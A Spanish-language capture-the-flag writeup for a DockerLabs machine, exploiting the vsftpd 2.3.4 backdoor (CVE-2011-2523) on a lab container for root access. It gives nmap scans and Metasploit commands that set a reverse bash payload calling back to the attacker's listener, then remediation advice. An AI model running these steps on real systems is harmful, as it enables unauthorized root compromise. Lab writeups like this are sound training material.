# Tproot-Dockerlabs
Laboratorio para practicar la explotación del backdoor de vsftpd 2.3.4 (CVE-2011-2523) para obtener acceso root.
# Writeup — tproot (DockerLabs)

> **Dificultad:** Fácil
> **Autor máquina:** David Rodríguez
> **Resumen:** Acceso directo a *root* explotando el backdoor histórico de **vsFTPd 2.3.4** (CVE-2011-2523). No requiere escalada de privilegios.

---

## 1. Reconocimiento

Escaneo completo de puertos con detección de servicios y versiones:

```bash
sudo nmap -p- -sV -sC -sS -vvv -Pn -n -T5 172.17.0.2
```

Resultado relevante:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Dos servicios:

- **21/tcp — FTP (vsftpd 2.3.4).** El login anónimo está habilitado pero falla
  al entrar (`500 OOPS: cannot change directory:/var/ftp`). La versión **2.3.4**
  es la pista clave.
- **80/tcp — HTTP (Apache).** Solo la página por defecto de Ubuntu. Actúa como
  **señuelo**: no hay contenido real ni rutas relevantes.

## 2. Identificación de la vulnerabilidad

vsFTPd **2.3.4** contiene un backdoor introducido en el código fuente
distribuido en 2011 (**CVE-2011-2523**). Cuando se envía un nombre de usuario
que contiene la secuencia `:)`, el servicio abre una shell con privilegios de
**root** en el puerto **6200/tcp**.

Confirmación con el script de nmap:

```bash
sudo nmap -p21 --script=vuln 172.17.0.2
```

```
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root) groups=0(root)
```

## 3. Explotación

### 3.1. Metasploit

Abrimos la consola y buscamos el módulo:

```
msfconsole 
search CVE-2011-2523
```

```
#  Name                                  Disclosure Date  Rank       Check  Description
-  ----                                  ---------------  ----       -----  -----------
0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

Lo seleccionamos (por nombre o por su número) y configuramos el objetivo:

```
use 0
set RHOSTS 172.17.0.2
```

Elegimos el payload y los datos de escucha, y lanzamos:

```
set payload cmd/unix/reverse_bash
set LHOST 172.17.0.1      # IP de la Kali en la red docker (gateway)
set LPORT 4444
run
```

```
[+] 172.17.0.2:21 - Backdoor has been spawned!
[*] Command shell session 1 opened (172.17.0.1:4444 -> 172.17.0.2:47578)
```

> **Nota de versión:** en builds recientes de Metasploit este módulo está
> refactorizado y el payload clásico `cmd/unix/interact` ya no figura en su
> lista de compatibles (`show payloads`) — asignarlo devuelve *"The value
> specified for payload is not valid"*. Por eso se usa un reverse shell como
> `cmd/unix/reverse_bash`.

### 3.2. Script de nmap

El propio `--script=vuln` ejecuta `id` a través de la backdoor y confirma la
ejecución como root (ver sección 2).

## 4. Root y flag

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
hostname
# dockerlabs
whoami
# root
```

Acceso como **root** conseguido directamente, sin fase de escalada de
privilegios.

## 5. Remediación

- **Actualizar vsFTPd** a una versión sin la backdoor (cualquiera posterior a la
  2.3.4 limpia). El backdoor nunca estuvo en el código oficial legítimo; vino de
  una distribución comprometida del tarball en 2011.
- No exponer FTP en texto plano; preferir **SFTP/FTPS**.
- Deshabilitar el acceso anónimo si no es estrictamente necesario.
- Segmentar la red para que un servicio comprometido no dé acceso directo como
  root al resto.

---

### Esquema del ataque

```
nmap -p-                → 21 (FTP vsftpd 2.3.4) + 80 (Apache, señuelo)
      │
      ▼
vsftpd 2.3.4 backdoor   → usuario con ":)" abre shell root en 6200
(CVE-2011-2523)
      │
      ▼
RCE como root           → uid=0(root) 
```
